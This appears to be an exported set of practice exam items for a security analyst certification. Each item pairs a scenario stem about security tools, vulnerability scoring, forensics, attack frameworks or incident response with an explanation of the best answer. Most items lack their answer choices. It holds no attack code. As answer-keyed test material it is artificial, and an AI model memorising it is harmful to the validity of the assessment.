questions.explanation: Nmap is the standard tool for host discovery, port scanning, and service and OS fingerprinting. Nessus is a vulnerability scanner; while it can scan ports, port and version enumeration with scripting is precisely Nmap's core function.

questions.stem: A junior analyst wants the simplest possible graphical utility to sweep a /24 for live hosts and a few common open ports without any scripting or plugins. Which of the following is BEST?
questions.explanation: Angry IP Scanner is a fast, lightweight IP and port sweeper aimed at quick discovery with minimal configuration. Nessus is a heavyweight vulnerability scanner, far more than is needed for a simple liveness and port sweep.

questions.stem: A penetration tester needs to intercept and modify HTTP and HTTPS requests to a web application, spider it, and test input fields for web vulnerabilities. Which of the following tools is BEST?
questions.explanation: Burp Suite is a web application proxy and scanner built to intercept, manipulate, and test HTTP(S) traffic. Nessus is a host vulnerability scanner and lacks Burp's interactive request interception and web-app testing workflow.

questions.stem: A team standardized on a free, OWASP-maintained web application proxy and scanner for testing apps in their pipeline. Which of the following tools are they MOST likely using?
questions.explanation: OWASP ZAP (Zed Attack Proxy) is the OWASP-maintained open-source web application proxy and scanner. Burp Suite serves the same purpose but is the commercial counterpart, not the OWASP-maintained free tool.

questions.stem: An analyst wants to scan a web server specifically for known dangerous files, default content, outdated server software, and common misconfigurations. Which of the following tools is BEST?
questions.explanation: Nikto is a web server scanner focused on dangerous files, outdated components, and misconfigurations. Nmap maps ports and services but does not enumerate web server specific dangerous files and known misconfigurations.

questions.stem: A vulnerability finding reported by a scanner must be proven exploitable by actually running an exploit and obtaining a session, to confirm it is not a false positive. Which of the following tools is BEST?
questions.explanation: Metasploit is an exploitation framework used to validate exploitability by launching exploits and payloads. Nessus and Nmap detect or enumerate but do not exploit, so they cannot prove the finding is genuinely exploitable.

questions.stem: A reverse engineer on Windows needs an interactive debugger specifically geared toward exploit development to step through a vulnerable binary. Which of the following tools is BEST?
questions.explanation: Immunity Debugger is a Windows debugger tailored to exploit development workflows. GDB is the command-line debugger for native binaries on Linux, not the Windows exploit-development tool described.

questions.stem: An analyst on Linux needs a command-line debugger to set breakpoints and inspect registers and memory while running a native ELF binary. Which of the following tools is BEST?
questions.explanation: The GNU Debugger (GDB) is the command-line debugger for native binaries on Linux. Immunity Debugger is a Windows-focused exploit-development debugger, not a Linux command-line debugger.

questions.stem: A cloud security team wants to audit security posture and misconfigurations across AWS, Azure, and Google Cloud accounts from one multi-cloud tool. Which of the following is BEST?
questions.explanation: Scout Suite is a multi-cloud security posture auditing tool that supports AWS, Azure, and GCP. Prowler is focused primarily on AWS best-practice assessment and is not the multi-cloud auditor described.

questions.stem: An auditor needs to assess an AWS account specifically against security best practices and compliance benchmarks such as CIS for AWS. Which of the following tools is BEST?
questions.explanation: Prowler performs AWS security best-practice and compliance assessments, including CIS benchmarks. Scout Suite is multi-cloud posture auditing in general; Prowler is the AWS compliance-focused assessment tool here.

questions.stem: A red team wants an offensive framework to actively exploit and pivot within an AWS environment during an authorized engagement. Which of the following tools is BEST?
questions.explanation: Pacu is an AWS exploitation framework for offensive cloud testing. Scout Suite and Prowler are defensive posture and compliance assessment tools, not offensive exploitation frameworks.

questions.stem: A malware analyst needs to statically disassemble and decompile an unknown binary to understand its logic without executing it. Which of the following tools is BEST?
questions.explanation: Ghidra is a disassembler and decompiler for static reverse engineering of binaries. GDB is a dynamic debugger that runs the binary; it is not primarily a static disassembler and decompiler.

questions.stem: An Nmap scan reports port 445 open with an SMB service banner on a server. A colleague concludes the host is definitely vulnerable to a known SMB exploit. Which of the following is the BEST critique of that conclusion?
choices: Nmap shows the port and service but not whether it is vulnerable
questions.explanation: Nmap identifies open ports and service versions but does not, by itself, confirm a vulnerability is present; a vulnerability scanner or exploit validation is needed. Assuming an open port equals a confirmed vulnerability conflates service discovery with vulnerability detection.

questions.stem: A vulnerability scanner returned a finding, and the analyst must confirm it is a true positive by checking the actual configuration on the host rather than trusting the scanner alone. Which of the following scan approaches would have produced the MOST reliable finding to begin with?
questions.explanation: A credentialed (authenticated) scan logs into the host and reads actual configuration and patch levels, yielding more accurate findings and fewer false positives. A non-credentialed scan infers from the outside and is more prone to false positives.

questions.stem: A SaaS-heavy organization wants a cloud-based vulnerability management platform that supports both lightweight agents and agentless network scanning with centralized risk scoring. Which of the following tools BEST fits?
questions.explanation: Qualys is a cloud-based vulnerability management platform offering both agent-based and agentless scanning with risk scoring. Wireshark is a packet analyzer and has no vulnerability management or scanning function.

questions.stem: A scanner flagged an outdated web server version, and the analyst wants to specifically probe the web server for known dangerous scripts and default files to corroborate. Which of the following tools BEST corroborates a web server finding?
questions.explanation: Nikto probes web servers for dangerous files, default content, and outdated software, corroborating a web server finding. GDB is a binary debugger and has no role in scanning a live web server for dangerous files.

questions.stem: A tester needs to fuzz a web application's input fields by sending large numbers of crafted payloads through an intercepting proxy and observing responses. Which of the following tools is BEST?
questions.explanation: Burp Suite's intercepting proxy and Intruder support crafting and replaying payloads against web app inputs. Nessus performs templated vulnerability checks and lacks the interactive request-fuzzing workflow of a web proxy.

questions.stem: An analyst wants an automated, standalone web application security scanner (not a manual proxy) to crawl an app and report injection and other web flaws. Which of the following tools is BEST?
questions.explanation: Arachni is an automated web application security scanner that crawls and tests for web vulnerabilities. Nmap maps ports and services and does not crawl and test web application logic for injection flaws.

questions.stem: During asset discovery, an analyst needs to fingerprint device types and operating systems across a network segment to build an inventory before vulnerability scanning. Which of the following tools is BEST?
questions.explanation: Nmap performs host discovery and OS and device fingerprinting, ideal for building an asset inventory. While Nessus can discover assets, OS and service fingerprinting for inventory is squarely Nmap's strength and lighter-weight here.

questions.stem: A team wants to confirm whether a critical Nessus finding is actually exploitable in their environment before scheduling an emergency patch. Which of the following is the BEST validation tool?
questions.explanation: Metasploit can attempt the exploit to validate that a reported vulnerability is genuinely exploitable in context. Nmap can only confirm the service is reachable, not that the specific vulnerability can be triggered.

questions.stem: An analyst needs to map an organization's externally facing hosts and discover relationships among its domains and registered infrastructure as part of attack surface discovery. Which of the following tools is BEST?
questions.explanation: Maltego maps relationships among domains, hosts, and infrastructure, useful for external attack surface discovery. Nessus scans known hosts for vulnerabilities but does not graph external relationships and infrastructure ownership.

questions.stem: An analyst reviewing Nmap output sees a service version string and wants to look up whether that exact version has published vulnerabilities. Which of the following BEST describes the correct next tool category?
choices: Use a vulnerability scanner or CVE database lookup
questions.explanation: After Nmap identifies the version, a vulnerability scanner or a CVE database lookup determines whether that version has known vulnerabilities. Wireshark, FTK Imager, and Volatility serve packet, disk imaging, and memory roles unrelated to mapping a version to known CVEs.

questions.stem: A team wants a single multipurpose tool that can scan ports, run NSE scripts for lightweight checks, and feed results into later analysis, valued for breadth in early assessment. Which of the following tools BEST fits?
questions.explanation: Nmap is the multipurpose discovery tool with a scripting engine (NSE) for lightweight checks during early assessment. Nessus is a dedicated vulnerability scanner, not the flexible multipurpose discovery and scripting tool described.

questions.stem: A web team integrated an automated scan into its build pipeline using a free, OWASP-maintained scanner that can run headless in continuous integration. Which of the following tools is MOST likely in use?
questions.explanation: OWASP ZAP supports headless automation and a free license, fitting continuous-integration pipeline scanning. Burp Suite Professional is commercial and licensed per seat, making it a less likely free pipeline default.

questions.stem: A forensic-curious analyst wants to extract readable strings from a suspicious binary discovered during a vulnerability assessment, as a quick triage before deeper analysis. Which of the following tools is BEST?
questions.explanation: Strings extracts printable text from a binary for quick static triage. Nessus and Nmap assess hosts and networks and do not pull static strings out of a single suspicious file.

questions.stem: A cloud team's audit returned dozens of misconfigured S3 buckets and IAM policies across one AWS account, and they need a tool focused on AWS compliance findings to repeat the audit on a schedule. Which of the following is BEST?
questions.explanation: Prowler is purpose-built for repeatable AWS security and compliance auditing, including IAM and storage checks. Pacu is an offensive AWS exploitation framework, not a compliance auditing tool for scheduled posture checks.

questions.stem: A scanner produced findings as a large JSON file from its API, and an analyst wants to filter only the critical-severity entries on the command line to triage. Which of the following tools is BEST?
questions.explanation: jq parses and filters JSON, making it ideal to select critical-severity entries from a scanner's JSON export. Plain grep struggles with nested JSON structure and would not reliably select by a severity field.

questions.stem: An analyst suspects a vulnerability scanner reported a service as vulnerable that is actually patched, and wants to verify by exploiting it safely in a lab clone. Which of the following frameworks is BEST for that verification?
questions.explanation: Metasploit lets the analyst attempt the exploit in a controlled lab to confirm or refute the scanner's finding. OpenVAS is another scanner that would likely repeat the same detection logic rather than independently proving exploitability.

questions.stem: A team needs to evaluate whether a web application is vulnerable to injection by actively crawling and submitting test payloads with a dedicated automated web scanner, not a host scanner. Which of the following pairs are BOTH appropriate web application scanners? (Select TWO.)
questions.explanation: Burp Suite and OWASP ZAP are both web application proxies and scanners designed to crawl and test apps for web vulnerabilities. Nessus is a host vulnerability scanner and Volatility is a memory forensics tool, neither of which is a web application scanner.

questions.stem: An analyst wants to confirm which operating systems are running on unmanaged hosts before deciding scan sensitivity, using active fingerprinting probes. Which of the following tools is BEST?
questions.explanation: Nmap performs active OS fingerprinting to identify operating systems on hosts. Wireshark passively inspects captured traffic and does not actively probe hosts to fingerprint their operating systems.

questions.stem: A team consuming a vendor's vulnerability scanner output wants to reverse engineer a flagged proprietary binary to understand the vulnerable code path. Which of the following tool categories is BEST?
questions.explanation: A disassembler and debugger (such as Ghidra plus GDB) reveal the vulnerable code path within a binary during reverse engineering. A packet analyzer inspects network traffic and cannot reveal a binary's internal code logic.

questions.stem: A scanner references CVE-2021-44228 for a finding. A colleague asks what a CVE identifier represents. Which of the following BEST describes it?
choices: A unique identifier for one specific publicly known vulnerability
questions.explanation: Common Vulnerabilities and Exposures (CVE) assigns a unique ID to one specific, publicly known vulnerability. A class or category of weakness is described by Common Weakness Enumeration (CWE), not by a CVE identifier.

questions.stem: A developer wants to reference the general category of flaw (for example, improper neutralization leading to cross-site scripting) rather than any single product's bug. Which of the following identifiers is appropriate?
questions.explanation: Common Weakness Enumeration (CWE) classifies types of software weaknesses, such as the XSS weakness class. A CVE identifies a single concrete vulnerability instance, not the general weakness category.

questions.stem: A vulnerability management tool needs to match scan findings to assets using a standardized naming scheme for products, vendors, and versions. Which of the following identifiers provides this?
questions.explanation: Common Platform Enumeration (CPE) standardizes names for products, platforms, and versions so findings can be matched to assets. CVE names a specific vulnerability and does not standardize product and version naming.

questions.stem: A CVSS base vector reads CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H. Which of the following metric values indicates the exploit can affect resources beyond the vulnerable component's own security authority?
questions.explanation: Scope changed (S:C) means the impact extends beyond the security authority of the vulnerable component, which raises severity. The attack vector network value (AV:N) indicates remote reachability, not impact crossing a security boundary.

questions.stem: In a CVSS base vector, the attack vector value is N (network). Which of the following BEST describes what this implies about exploitation?
choices: The vulnerability is remotely exploitable across a network
questions.explanation: Attack vector network (AV:N) means the vulnerability can be exploited remotely over a network, which increases reachability and severity. Requiring physical or local access would correspond to the physical or local attack-vector values, not network.

questions.stem: Comparing two findings with identical impact metrics, one has privileges required of None (PR:N) and the other High (PR:H). Which of the following statements is correct about severity contribution?
choices: PR:H raises severity more than PR:N
PR has no effect on the score
PR:N raises severity because no privileges are needed to exploit
PR only matters for local attacks
questions.explanation: Privileges required of None (PR:N) increases severity because the attacker needs no existing privileges to exploit the flaw. Requiring high privileges (PR:H) lowers the score because exploitation is harder, so PR:H does not raise severity more.

questions.stem: An analyst must explain why an authenticated scan generally yields more accurate results than an unauthenticated one. Which of the following BEST states the reason?
choices: It logs into the host and reads actual configuration, reducing false positives
questions.explanation: A credentialed (authenticated) scan logs in to read real configuration and patch state, producing fewer false positives. A non-credentialed scan only infers from the outside, which makes it more prone to false positives, not more accurate.

questions.stem: An analyst needs continuous, deep visibility into each endpoint's installed software and configuration even when the host is off the corporate network. Which of the following scanning approaches BEST provides this?
questions.explanation: Agent-based scanning installs software on the host, giving continuous deep visibility regardless of network location. Agentless scanning depends on reaching the host over the network and cannot inspect it when it is off-network.

questions.stem: A team must assess vulnerabilities on a sensitive operational technology network where injecting probe traffic could disrupt processes. Which of the following scanning approaches is SAFEST?
questions.explanation: Passive scanning observes existing traffic without injecting probes, making it the safest choice for fragile OT environments. Active scanning sends probe traffic that can disrupt sensitive industrial control systems.

questions.stem: A program distinguishes scans launched from outside the perimeter (as an internet attacker would see) from scans launched inside the trusted network. Which of the following terms BEST labels the outside-in scan?
questions.explanation: An external scan assesses assets from outside the perimeter, reflecting an internet-based attacker's view. An internal scan runs from inside the trusted network and would not capture the external exposure perspective.

questions.stem: A secure development team analyzes source code for flaws without executing the program, early in the pipeline. Which of the following analysis types BEST describes this?
questions.explanation: Static analysis (SAST) examines source or binary code without running it, enabling early detection. Dynamic analysis (DAST) tests the running application and therefore requires execution, unlike the approach described.

questions.stem: A tester feeds large volumes of malformed and unexpected input to a running application to trigger crashes and uncover memory-safety flaws. Which of the following techniques BEST describes this?
questions.explanation: Fuzzing sends malformed or random input to a running target to provoke faults and find vulnerabilities. Static analysis inspects code without execution and does not involve feeding live malformed input to a running program.

questions.stem: An analyst must remediate vulnerabilities and wants to factor in the probability that each CVE will actually be exploited in the wild, beyond its base severity. Which of the following data sources BEST provides that probability?
questions.explanation: The Exploit Prediction Scoring System (EPSS) estimates the likelihood that a CVE will be exploited. The CVSS base score measures intrinsic severity but does not estimate real-world exploitation probability.

questions.stem: A program wants to prioritize patching CVEs that are confirmed to be actively exploited by attackers right now, per an authoritative government catalog. Which of the following resources BEST supports this?
questions.explanation: The CISA Known Exploited Vulnerabilities (KEV) catalog lists vulnerabilities confirmed to be exploited in the wild, driving urgent prioritization. EPSS estimates probability of exploitation but does not confirm active, observed exploitation like KEV does.

questions.stem: A newly discovered vulnerability has no vendor patch and no prior public disclosure, and is already being exploited. Which of the following terms BEST describes it?
questions.explanation: A zero-day is a vulnerability exploited before a patch or public disclosure exists, leaving defenders no lead time. A false positive is a scanner result that does not reflect a real vulnerability, which is unrelated to disclosure timing.

questions.stem: A scanner reports a host as vulnerable, but manual verification shows the host is fully patched and not affected. Which of the following terms BEST describes the scanner's result?
questions.explanation: A false positive is a benign condition flagged as a vulnerability, exactly what occurred when the patched host was reported as vulnerable. A false negative is the opposite: a real vulnerability the scanner missed.

questions.stem: A scanner reports no vulnerability on a host that is in fact exploitable, and the gap is later discovered after an incident. Which of the following terms BEST describes the original scan result?
questions.explanation: A false negative is a real vulnerability that the scan failed to detect, the dangerous miss described here. A false positive would be flagging a non-issue, which is the opposite of missing a real one.

questions.stem: When a permanent fix is not yet feasible, a team applies an alternative safeguard (such as a firewall rule or network isolation) to reduce risk from a known vulnerability in the interim. Which of the following terms BEST describes this safeguard?
questions.explanation: A compensating control is an alternative safeguard applied when the primary fix is not yet feasible, reducing risk in the interim. A detective control identifies events after they occur and does not substitute for an unavailable fix.

questions.stem: A risk owner formally decides to take no action on a low-impact vulnerability because the cost of remediation exceeds the potential loss, and documents the decision. Which of the following risk responses BEST describes this?
questions.explanation: Risk acceptance is the documented decision to take no further action and bear the residual risk. Mitigation would reduce the risk through controls, which is not what the owner chose to do here.

questions.stem: An organization buys cyber insurance to shift the financial consequences of a potential breach to a third party. Which of the following risk responses BEST describes this?
questions.explanation: Risk transfer shifts the impact (often financial) to a third party, such as through insurance. Risk avoidance would eliminate the activity causing the risk altogether, which buying insurance does not do.

questions.stem: A company decides to discontinue a legacy service entirely rather than operate it with an unpatchable critical flaw. Which of the following risk responses BEST describes this?
questions.explanation: Risk avoidance eliminates the risk by ceasing the risky activity, such as retiring the vulnerable service. Mitigation would keep the service while reducing risk with controls, which is not the decision described.

questions.stem: An analyst classifies an account-lockout policy that stops brute-force attempts before they succeed. Using CompTIA's functional control types, which of the following BEST categorizes it?
questions.explanation: A preventative control stops an incident before it occurs, which is exactly what account lockout does against brute-force attempts. A detective control would identify the attempts after they happen rather than prevent the success.

questions.stem: A security awareness training program and the organization's policies that govern behavior are classified by control category. Which of the following BEST categorizes these as a control type?
questions.explanation: Managerial controls are administrative measures such as policies, governance, and training that direct how security is managed. Technical controls are implemented in technology (such as firewalls), which does not describe policy and training.

questions.stem: A development team adopts parameterized queries to neutralize a class of injection attacks against its database. Which of the following secure-coding practices does this BEST represent, and which flaw does it counter?
choices: Parameterized queries to stop SQL injection
Input validation to stop buffer overflow
questions.explanation: Parameterized queries separate code from data so attacker input cannot alter SQL logic, directly countering SQL injection. Output encoding mitigates cross-site scripting, a different flaw, so it does not describe this control or its target.

questions.stem: A team formalizes identifying and ranking threats during design using a structured approach (for example, STRIDE) before code is written. Which of the following activities BEST describes this?
questions.explanation: Threat modeling systematically identifies and prioritizes threats during design, with STRIDE as a common method. Penetration testing assesses a built system at runtime and is not the design-phase modeling activity described.

questions.stem: A responder captured a RAM image from a compromised host and must enumerate running processes, network connections, and injected code from that image. Which of the following tools is BEST?
questions.explanation: Volatility is the memory forensics framework for analyzing processes, connections, and injected code from a RAM image. Autopsy analyzes disk and file system artifacts, not the contents of a memory capture.

questions.stem: An investigator must create a bit-for-bit forensic image of a suspect drive while preserving the original for evidence. Which of the following tools is BEST?
questions.explanation: FTK Imager creates verified bit-for-bit disk images while preserving the source, suitable for evidence acquisition. Volatility analyzes memory and does not acquire forensic images of disks.

questions.stem: A forensic analyst needs to examine a disk image's file system, recover deleted files, and build a timeline from an open-source suite. Which of the following tools is BEST?
questions.explanation: Autopsy (with The Sleuth Kit) is an open-source disk forensics suite for file system analysis, deleted-file recovery, and timelines. Volatility performs memory analysis and does not parse disk file systems.

questions.stem: A responder wants to compute a cryptographic hash of a seized file both to create an indicator of compromise and to prove the evidence has not changed. Which of the following BEST accomplishes this?
choices: A hashing tool such as sha256sum
questions.explanation: A hashing tool (for example, sha256sum) produces a fixed digest used as an IoC and to validate integrity over time. Strings extraction only pulls readable text and cannot prove the file is unchanged or serve as an integrity hash.

questions.stem: A host's disk looks clean, but the responder suspects fileless malware resident only in memory. Which of the following tools is BEST to find the malicious in-memory process and its network connections?
questions.explanation: Volatility analyzes a memory image to reveal in-memory (fileless) processes and their network connections. Autopsy examines disk artifacts and would miss malware that exists only in RAM.

questions.stem: Following the order of volatility, a responder must capture the MOST volatile evidence first from a running compromised host. Which of the following acquisitions should occur FIRST?
questions.explanation: Order of volatility dictates collecting the most volatile data (RAM) first before it is lost, which a memory capture preserves. Disk imaging captures non-volatile data that persists, so it can follow the volatile memory acquisition.

questions.stem: An analyst wants to hunt across many endpoints during an incident for any files matching the byte signature of the malware found on the first host. Which of the following is BEST?
questions.explanation: A YARA rule matches files by content signature, ideal for sweeping endpoints for the same malware during an incident. A Sigma rule targets log events, not file content, so it cannot match the malware's byte signature on disk.

questions.stem: During containment, an analyst wants a portable detection rule to spot the adversary's technique in the SIEM logs regardless of the SIEM product. Which of the following is BEST?
questions.explanation: Sigma provides vendor-neutral log detection rules that convert across SIEM platforms, suited to detecting the technique in logs. YARA matches file content and cannot express a SIEM log-detection rule.

questions.stem: A responder needs to collect volatile artifacts (running processes, logged-in users, open connections) from many Windows endpoints quickly using built-in scripting. Which of the following is BEST?
questions.explanation: PowerShell is native to Windows and ideal for scripting collection of volatile endpoint artifacts at scale. GDB is a Linux binary debugger and is not used to collect live Windows endpoint state.

questions.stem: A responder is handed a memory image but mistakenly opens it in a disk forensics tool and finds nothing useful. Which of the following corrections is BEST?
choices: Use FTK Imager to re-image it
Use Volatility, which is built for memory images
questions.explanation: Volatility is purpose-built to parse memory images and extract processes and connections that disk tools cannot interpret. A disk forensics tool expects a file system layout, so it cannot meaningfully analyze a raw RAM capture.

questions.stem: A responder must image a disk for evidence but is told only to use a command-line acquisition utility that performs a bit-for-bit copy on Linux. Which of the following is BEST?
questions.explanation: dd performs a bit-for-bit copy of a disk or partition at the command line, suitable for forensic acquisition. Volatility analyzes memory and does not acquire a disk image.

questions.stem: After acquisition, an analyst wants to quickly check whether the malicious binary's hash is already known to security vendors before deeper analysis. Which of the following tools is BEST?
questions.explanation: VirusTotal returns multi-engine reputation for a file hash, a fast first check during an incident. Volatility analyzes memory and does not look up file hash reputation across vendors.

questions.stem: An analyst wants to triage a recovered binary for embedded indicators (URLs, paths, IPs) without executing it during the incident. Which of the following tools is BEST?
questions.explanation: Strings extracts printable text from the binary, surfacing embedded indicators quickly and safely. Wireshark inspects network captures and would not extract static strings from a file.

questions.stem: To preserve the integrity of acquired evidence and detect any later tampering, a responder records a hash of each image and re-verifies it before analysis. Which of the following objectives does this BEST support?
questions.explanation: Hashing and re-verifying images supports validating data integrity, proving evidence has not changed. Containment limits the spread of an incident and is unrelated to verifying evidence integrity.

questions.stem: An analyst wants to detect malicious network traffic signatures in line during the incident to spot continued command and control. Which of the following tools is BEST?
questions.explanation: Snort matches network traffic against signature rules in line, suitable for detecting ongoing command-and-control traffic. YARA matches file content, not live network packets, so it cannot detect C2 traffic on the wire.

questions.stem: A responder needs to analyze full packet captures collected during an incident to reconstruct exactly what an attacker sent and received over a session. Which of the following tools is BEST?
questions.explanation: Wireshark reconstructs sessions from packet captures and decodes their contents for analysis. Volatility analyzes memory images and cannot reconstruct network sessions from a packet capture.

questions.stem: An adversary registers domains and stages a phishing kit and malware before sending anything to the target. In the Cyber Kill Chain, which of the following stages BEST describes preparing the malicious payload?
questions.explanation: Weaponization is the stage where the attacker prepares the payload (for example, coupling an exploit with malware) before transmission. Delivery is the later stage of actually transmitting that payload to the victim, which has not happened yet.

questions.stem: A user receives and opens a malicious attachment that runs code, giving the attacker initial code execution. In the Cyber Kill Chain, which of the following stages does the code running BEST represent?
questions.explanation: Exploitation is when the delivered payload's code actually executes on the target. Delivery is the prior transmission of the attachment; the execution of its code is the exploitation stage.

questions.stem: After initial code execution, malware writes itself to a registry Run key to survive reboot. In the Cyber Kill Chain, which of the following stages BEST describes establishing persistence?
questions.explanation: Installation is the stage where the attacker establishes persistence, such as installing malware or a Run-key entry. Command and control is the subsequent stage of establishing a remote channel, not the act of persisting on the host.

questions.stem: A compromised host opens a covert channel back to the attacker's server to receive instructions. In the Cyber Kill Chain, which of the following stages BEST describes this?
questions.explanation: Command and control (C2) is the stage where the victim establishes a channel for the attacker to remotely direct it. Actions on objectives is the later stage where the attacker pursues goals such as exfiltration, which requires the C2 channel first.

questions.stem: An analyst maps an intrusion using four features: the adversary, the victim, the infrastructure used, and the capability deployed. Which of the following frameworks is the analyst using?
questions.explanation: The Diamond Model analyzes intrusions through four core features: adversary, victim, infrastructure, and capability. The Cyber Kill Chain instead describes sequential attack stages, not these relationship features.

questions.stem: An analyst wants a catalog of post-compromise adversary techniques organized by tactic, each with an identifier such as T1059, to map observed behavior. Which of the following frameworks BEST fits?
questions.explanation: MITRE ATT&CK is a catalog of adversary tactics and techniques with technique IDs (for example, T1059) focused on post-compromise behavior. The Diamond Model describes intrusion relationships and does not provide a technique catalog with IDs.

questions.stem: A manager wants to know the key distinction between the Cyber Kill Chain and MITRE ATT&CK. Which of the following statements is MOST accurate?
choices: The Kill Chain is linear high-level stages; ATT&CK is a detailed technique catalog
ATT&CK is linear and the Kill Chain is a catalog
questions.explanation: The Cyber Kill Chain presents a linear sequence of high-level stages, while MITRE ATT&CK is a granular catalog of tactics and techniques. Saying ATT&CK is linear and the Kill Chain is a catalog reverses their actual structures.

questions.stem: A new analyst is told to follow the NIST-style incident response life cycle in order. Which of the following sequences is correct?
choices: Preparation; detection and analysis; containment, eradication, and recovery; post-incident activity
questions.explanation: The correct order is preparation; detection and analysis; containment, eradication, and recovery; then post-incident activity. Sequences that place eradication or recovery before containment violate the life cycle's ordering.

questions.stem: During a live intrusion, responders disconnect the affected host from the network to stop the attacker from spreading, before removing the malware. Which of the following IR phases BEST describes disconnecting the host?
questions.explanation: Containment limits the incident's spread, such as isolating the host, and precedes removal of the threat. Eradication is the later removal of the malware, which should follow containment, not replace it.

questions.stem: After containing an incident, the team removes the malware, deletes attacker accounts, and closes the exploited vulnerability. Which of the following IR phases BEST describes these actions?
questions.explanation: Eradication removes the threat and root cause artifacts (malware, attacker accounts, the exploited weakness) after containment. Recovery is the subsequent restoration of systems to normal operation, which follows eradication.

questions.stem: Following eradication, the team restores systems from clean backups, re-images hosts, and returns services to normal operation while monitoring closely. Which of the following IR phases BEST describes this?
questions.explanation: Recovery restores systems to normal operation (restoring backups, re-imaging) after the threat is eradicated. Eradication is the prior removal of the threat, not the restoration of service that recovery covers.

questions.stem: Responders document each person who handled a piece of evidence, when, and why, to ensure it is admissible. Which of the following terms BEST describes this documentation?
questions.explanation: Chain of custody documents every transfer and handling of evidence to preserve its integrity and admissibility. Order of volatility concerns the sequence of evidence collection, not who handled it afterward.

questions.stem: During collection, responders capture evidence in a sequence from most to least perishable (CPU registers and RAM before disk and backups). Which of the following principles BEST describes this sequence?
questions.explanation: Order of volatility prescribes collecting the most perishable data first (registers, RAM) before less volatile sources (disk, backups). Chain of custody tracks handling of evidence but does not dictate the collection sequence by volatility.

questions.stem: Legal counsel instructs the team to preserve all data potentially relevant to anticipated litigation and to suspend routine deletion. Which of the following terms BEST describes this directive?
questions.explanation: A legal hold suspends normal data destruction to preserve information relevant to litigation. Chain of custody documents evidence handling but does not, by itself, halt routine data deletion across the organization.

questions.stem: After an incident is resolved, the team meets to determine the underlying reason the breach was possible, beyond the immediate symptoms. Which of the following activities BEST describes this?
questions.explanation: Root cause analysis (RCA) identifies the fundamental reason an incident occurred so it can be prevented from recurring. A lessons-learned summary captures broader takeaways and improvements but is distinct from pinpointing the underlying cause.

questions.stem: Before any incident, the team runs a discussion-based scenario walkthrough to practice roles and decisions without touching production systems. Which of the following preparation activities BEST describes this?
questions.explanation: A tabletop exercise is a discussion-based walkthrough used in preparation to rehearse roles and decisions. A penetration test is a live technical assessment, not a discussion-based rehearsal of the incident response plan.

questions.stem: A team maintains step-by-step procedures that specify exactly how to respond to particular incident types, such as ransomware or phishing. Which of the following terms BEST describes these documents?
questions.explanation: Playbooks are predefined, step-by-step procedures for handling specific incident types. A business impact analysis assesses the consequences of disruptions and is not a step-by-step response procedure.

questions.stem: An organization maintains plans to keep critical operations running during a disruption and to restore IT systems after a disaster. Which of the following pairs BEST labels these two plans, respectively?
questions.explanation: Business continuity (BC) keeps critical operations running during disruption, while disaster recovery (DR) restores IT systems afterward. Reversing the two mislabels continuity planning as recovery and vice versa.

questions.stem: During analysis, responders estimate how many systems, accounts, and data sets the attacker actually touched. Which of the following terms BEST describes what they are determining?
questions.explanation: Scope defines the extent of the compromise: which systems, accounts, and data were affected. Impact describes the business consequence or damage, which is related but distinct from the breadth of systems touched.

questions.stem: After collecting indicators of compromise from the first infected host, the team uses them to search the rest of the environment for additional infected systems. Which of the following BEST describes this use of IoCs?
questions.explanation: IoC application is using collected indicators to detect the same threat elsewhere in the environment. IoC collection is the prior step of gathering the indicators, not the act of searching with them.

questions.stem: An assessor uses a peer-reviewed methodology focused on measuring operational security through repeatable, metrics-based security testing. Which of the following frameworks is MOST likely in use?
questions.explanation: The Open Source Security Testing Methodology Manual (OSSTMM) provides a repeatable, metrics-based methodology for operational security testing. MITRE ATT&CK is an adversary technique catalog, not a security-testing methodology.

questions.stem: During recovery, a team cannot immediately patch a still-vulnerable legacy system but must bring it back online, so they place it behind strict network filtering as an interim safeguard. Which of the following BEST describes that safeguard?
questions.explanation: A compensating control is an interim safeguard applied when the primary fix is not yet possible, such as strict filtering around an unpatched system. Eradication removes the threat entirely and does not describe an interim risk-reducing measure.

questions.stem: An attacker spends weeks scanning and gathering employee details and exposed services before any intrusion. In the Cyber Kill Chain, which of the following stages BEST describes this information gathering?
questions.explanation: Reconnaissance is the first stage, where the attacker gathers information about the target before acting. Weaponization is the later preparation of the payload, which follows the information-gathering reconnaissance stage.

questions.stem: An analyst documents the attacker's command-and-control servers and the domains used as part of the Diamond Model. Which of the following Diamond Model features do these BEST represent?
questions.explanation: Infrastructure in the Diamond Model refers to the physical or logical resources (C2 servers, domains) the adversary uses. Capability refers to the tools and malware (the how), not the servers and domains that constitute infrastructure.

questions.stem: A SOC manager wants a recurring dashboard that trends mean time to detect and alert volume month over month for leadership. Which of the following platforms is BEST to build that reporting view?
questions.explanation: A SIEM dashboard aggregates event and metric data over time, ideal for trending detection metrics and alert volume for reporting. Volatility is a memory forensics tool and cannot produce operational reporting dashboards.

questions.stem: A vulnerability manager needs to produce a recurring executive report of open findings, affected hosts, and remediation status from scan data. Which of the following tools is the MOST appropriate source for that report?
choices: A vulnerability management platform's reporting module
questions.explanation: A vulnerability management platform (such as Nessus or InsightVM) includes reporting that summarizes findings, affected hosts, and remediation status. Wireshark analyzes packets and has no vulnerability reporting capability.

questions.stem: An analyst must turn a scanner's JSON export into a concise report listing only critical findings and their host counts for stakeholders. Which of the following tools BEST helps extract that data on the command line?
questions.explanation: jq parses and filters the JSON export to pull out critical findings and counts for the report. Volatility analyzes memory images and cannot parse a scanner's JSON output.

questions.stem: Leadership wants one consolidated executive view that pulls metrics from the SIEM, the vulnerability scanner, and the ticketing system into a single screen. Which of the following concepts BEST describes this reporting goal?
questions.explanation: Single pane of glass describes a unified console consolidating metrics from multiple tools for reporting. Chain of custody concerns evidence handling and is unrelated to consolidating reporting metrics.

questions.stem: A team wants to automatically generate and route an incident ticket with a summary to stakeholders the moment a high-severity alert fires, without an analyst drafting it. Which of the following capabilities BEST supports this reporting automation?
questions.explanation: SOAR can automate the creation and routing of tickets and notifications as part of a response playbook. WHOIS is a lookup utility and cannot generate or route incident reports.

questions.stem: A reporting analyst needs to compute and visualize alert volume per analyst per shift from raw log events for a capacity report. Which of the following platforms is BEST?
questions.explanation: A SIEM with reporting can aggregate raw events into metrics such as alert volume per shift and visualize them. Autopsy is a disk forensics tool and does not compute or visualize operational alert-volume metrics.

questions.stem: A SOC reports the average elapsed time between when a compromise begins and when the SOC first identifies it. Which of the following metrics BEST describes this?
questions.explanation: Mean time to detect (MTTD) measures the average time from incident onset to detection. Mean time to respond (MTTR) measures how long it takes to act after detection, which is a later interval, not the time to first identify.

